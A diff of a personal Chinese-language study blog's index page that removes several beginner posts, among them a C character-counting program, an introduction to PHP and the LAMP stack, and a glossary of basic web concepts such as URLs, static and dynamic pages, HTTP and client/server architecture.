-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>  zhimu=<span class="number">0</span>,kongge=<span class="number">0</span>,shuzhi=<span class="number">0</span>,other=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">char</span>  ch;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Please enter a string of characters.&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> ((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;Z&#x27;</span> || ch &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">			zhimu++;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ch &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">			shuzhi++;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">			kongge++;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			other++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;字母数为%d\n数字数为%d\n空格数为%d\n其他字符个数为%d\n&quot;</span>,zhimu,shuzhi,kongge,other);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2021/10/27/QsZG5cx6UCBEq2p.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/10/27/PHP(1)/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/27/PHP(1)/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-10-27 22:44:15" itemprop="dateCreated datePublished" datetime="2021-10-27T22:44:15+08:00">2021-10-27</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="PHP-1"><a href="#PHP-1" class="headerlink" title="PHP(1)"></a>PHP(1)</h1><h3 id="对PHP的理解"><a href="#对PHP的理解" class="headerlink" title="对PHP的理解:"></a>对PHP的理解:</h3><p>全称为Hypertext Preprocessor，即超文本预处理器</p>
-<p>PHP最初是个人主页（Personal Home Page）的缩写</p>
-<p>是一种在服务器端运行的开源的脚本语言</p>
-<p><img src="https://i.loli.net/2021/10/24/fFiravWgTluE7Xe.png"></p>
-<h4 id="黄金组合"><a href="#黄金组合" class="headerlink" title="黄金组合"></a>黄金组合</h4><p><strong>LAMP</strong>组合（<u><strong>Linux,Apache,MySQL,PHP</strong></u>),这四个产品都是公开源代码的产品，无版权之争。 </p>
-<p><em>php</em>是一门语言，用来做业务逻辑</p>
-<p><em>Apache</em>为<em>php</em>提供了运行环境</p>
-<p><em>mysql</em>数据库用来存储数据</p>
-<h6 id="wapm组合：window-apche-mysql-php"><a href="#wapm组合：window-apche-mysql-php" class="headerlink" title="wapm组合：window+apche+mysql+php"></a>wapm组合：window+apche+mysql+php</h6>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&%E6%A6%82%E5%BF%B5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/24/%E4%B8%93%E4%B8%9A%E5%90%8D%E7%A7%B0&%E6%A6%82%E5%BF%B5/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-10-24 23:54:07" itemprop="dateCreated datePublished" datetime="2021-10-24T23:54:07+08:00">2021-10-24</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-10-25 17:22:06" itemprop="dateModified" datetime="2021-10-25T17:22:06+08:00">2021-10-25</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="专业名词-amp-概念"><a href="#专业名词-amp-概念" class="headerlink" title="专业名词&amp;概念"></a>专业名词&amp;概念</h1><p>[TOC]</p>
-<h3 id="URL（网址）路径"><a href="#URL（网址）路径" class="headerlink" title="URL（网址）路径"></a>URL（网址）路径</h3><p>如：内卷的代价(<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4">https://www.bilibili.com/video/BV1qf4y1g7yG?spm_id_from=333.851.b_7265636f6d6d656e64.4</a>)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">统一资源定位符 (uniform resource locator, url) 是用于完整地描述internet上网页和其他资源的地址的一种标识方法。 internet上的每一个网页都具有一个唯一的名称标识，通常称之为url地址，这种地址可以是本地磁盘，也可以是局域网上的某一台计算机，更多的是internet上的站点。简单地说，url就是web地址，俗称“网址”。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（协议）：//（主机名）/（端口号）/（文件名）/（文件路径） </span><br><span class="line">有两种超文本传送协议格式 </span><br><span class="line">mms </span><br><span class="line">http </span><br><span class="line">而后面的拓展名 是根据文件的类型来定义的 </span><br><span class="line">详细格式为： </span><br><span class="line">&#123;协议&#125;：//&#123;用户名&#125;:&#123;密码&#125;@&#123;主机名&#125;:&#123;端口号&#125;/&#123;路径&#125;/&#123;文件&#125;?&#123;参数&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="静态页面："><a href="#静态页面：" class="headerlink" title="静态页面："></a>静态页面：</h3><p><em><strong>简单来说</strong></em><em>就是</em>**服务器不执行的页面</p>
-<p><strong>仔细地说就是</strong>无需经过服务器的编译，直接加载到客户浏览器上显示出来；占服务器空间，不能自主更新页面，每个网页都是一个独立的文件。静态页面一般是.html .shtml .htm 结尾，URL路径没有特殊符号如？% 等，无需加载后台程序 无需获取后台数据库，<u>用户只能在网页中浏览不能做任何的数据交换</u></p>
-<p><strong>优点：</strong></p>
-<p>1、访问速度快</p>
-<p>2、内容相对稳定，比较容易被搜索引擎检索</p>
-<p><strong>缺点：</strong></p>
-<p>1、无数据库的支持，在网站制作和维护方面工作量较大；</p>
-<p>2、交互性较差，在功能方面有较大的限制；</p>
-<h3 id="动态页面："><a href="#动态页面：" class="headerlink" title="动态页面："></a>动态页面：</h3><p><strong>简单来说</strong>服务器执行的页面</p>
-<p><strong>不简单地说</strong>动态页面一般指动态获取数据库查询，URL路径中包含特殊符号如 ？%等，例如淘宝网宝贝的筛选等。</p>
-<p><img src="https://i.loli.net/2021/10/25/K5z9M2gpfBXTNws.jpg"></p>
-<p>采用数据库的开发模式</p>
-<p><strong>优点：</strong></p>
-<p>1、可以实现更多的功能，如登录、注册、用户管理、订单管理等；</p>
-<p><strong>缺点：</strong></p>
-<p>1、在访问速度上不占优势</p>
-<p>先获得用户指令，然后网页拿着指令到数据库找和指令对应的数据，然后传递给服务器，通过服务器的编译生成html代码，最后传递给用户浏览器。</p>
-<p>这一过程需要几秒的时间，访问人数一多，加载速度就会变慢，对于服务器来说是一种负担；</p>
-<p>2、在搜索引擎收录方面不占优势</p>
-<p>动态页面是经过用户输入指令后才形成的页面，实际上并不存在这个页面；而搜索引擎只会抓取现成的。</p>
-<h3 id="html"><a href="#html" class="headerlink" title="html"></a><strong>html</strong></h3><p>html文件就是正常见到的网页格式的文件，一般这种文件到了电脑上之后，就会变成默认浏览器的图标，就是说这个文件会使用这个浏览器打开。</p>
-<p>　　HTML称为超文本标记语言，是一种标识性的语言。它包括一系列标签，通过这些标签可以<strong>将网络上的文档格式统一</strong>，使分散的Internet资源连接为一个逻辑整体。HTML文本是由HTML命令组成的描述性文本，HTML命令可以说明文字，图形、动画、声音、表格、链接等。</p>
-<h3 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h3><p>　　超文本*<u>是一种组织信息的方式</u>*，它<strong>通过超级链接方法将文本中的文字、图表与其他信息媒体相关联</strong>。这些相互关联的信息媒体可能在同一文本中，也可能是其他文件，或是地理位置相距遥远的某台计算机上的文件。这种组织信息方式将分布在不同位置的信息资源用随机方式进行连接，为人们查找，检索信息提供方便。</p>
-<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><p><img src="https://i.loli.net/2021/10/25/gU8E4OS9QzCyqeB.png"></p>
-<ul>
-<li><table>
-<thead>
-<tr>
-<th align="center">返回的状态码：</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">200表示成功</td>
-</tr>
-<tr>
-<td align="center">403访问被决绝</td>
-</tr>
-<tr>
-<td align="center">404页面没有找到</td>
-</tr>
-</tbody></table>
-</li>
-</ul>
-<p><img src="https://i.loli.net/2021/10/25/U6ZuQnfAi439G1O.png"></p>
-<p><img src="https://i.loli.net/2021/10/25/tJaNsUYvG5fwZbx.png"></p>
-<h3 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h3><p>就是一个名字</p>
-<h3 id="CMS"><a href="#CMS" class="headerlink" title="CMS"></a>CMS</h3><p><strong>CMS简单的说就是制作和管理网页用的一个工具软件</strong> 现在CMS建站系统非常的多 帝国、科讯等。<strong>就是内容管理系统..说的简单点..其实就是一个网站的整体模板。</strong>每种CMS的界面和操作规则都不太一样 基本都属于二次开发 让一些有基础但又称不上高手的人 用CMS建站系统建立并管理网站（代码多少得懂点）<br>注：基本上用CMS建立的网站都是在软件给出的效果中选择 不能随心所欲的设计（随心所欲的设计得是那些高手才行的 用CMS可以满足正常的建站要求）</p>
-<h3 id="客户端和服务器端"><a href="#客户端和服务器端" class="headerlink" title="客户端和服务器端"></a>客户端和服务器端</h3><p>客户端：浏览者</p>
-<p>服务器端：给浏览者提供</p>
-<p><img src="https://i.loli.net/2021/10/25/F5RWLd3Y8ZKrbpo.jpg"></p>
-<p><strong>红色方块</strong>为端口，里面的数字是端口号</p>
-<h3 id="BS架构和CS架构"><a href="#BS架构和CS架构" class="headerlink" title="BS架构和CS架构"></a>BS架构和CS架构</h3><p>网络系统软件开发包括B/S与C/S两种结构都可以进行同样的业务处理</p>
-<h4 id="BS-通过浏览器去访问服务器"><a href="#BS-通过浏览器去访问服务器" class="headerlink" title="**BS:**通过浏览器去访问服务器"></a>**BS:**通过浏览器去访问服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b:browser(浏览器)</span><br><span class="line">s：sever（服务器）</span><br></pre></td></tr></table></figure>
-
-<p>所以的web都是BS架构的</p>
-<p>特点：</p>
-<p>1 不需要下载特定的客户端（方便）</p>
-<p>2 和服务器进行HTTP协议</p>
-<p>3 它将所以的数据储存在服务器上</p>
-<p>优缺点：</p>
-<p>1.B/S结构维护升级更方便</p>
-<p>2.成本低，不用开发特定的客户端</p>
-<p>3.数据相对安全，因为已经储存在服务器上</p>
-<p>1，应用服务器运行数据复合较重</p>
-<h4 id="CS：特定的客户端（client-去连接服务器-server"><a href="#CS：特定的客户端（client-去连接服务器-server" class="headerlink" title="CS：特定的客户端（client)去连接服务器(server)"></a><strong>CS</strong>：特定的客户端（client)去连接服务器(server)</h4><p>如：王者荣耀     QQ</p>
-<p>特点：</p>
-<p>1 C/S软件通常需要特定的客户端来使用。</p>
-<p>2 可以通过任意协议进行通信。</p>
-<p>3 它的客户端有数据处理和存储的能力，可以把应用程序的计算和数据分配在客户端和服务器端。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://wifi-0x.github.io/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="微风">
-      <meta itemprop="description" content="微风的学习记录">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Breeze">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/10/24/%E6%B5%8B%E8%AF%95%E4%B8%80%E4%B8%8B/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2021-10-24 11:02:57 / 修改时间：11:02:58" itemprop="dateCreated datePublished" datetime="2021-10-24T11:02:57+08:00">2021-10-24</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>测试一下</p>
-<p><img src="https://i.loli.net/2021/10/24/sdUu2WRB7rQahID.jpg"></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -995,7 +935,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
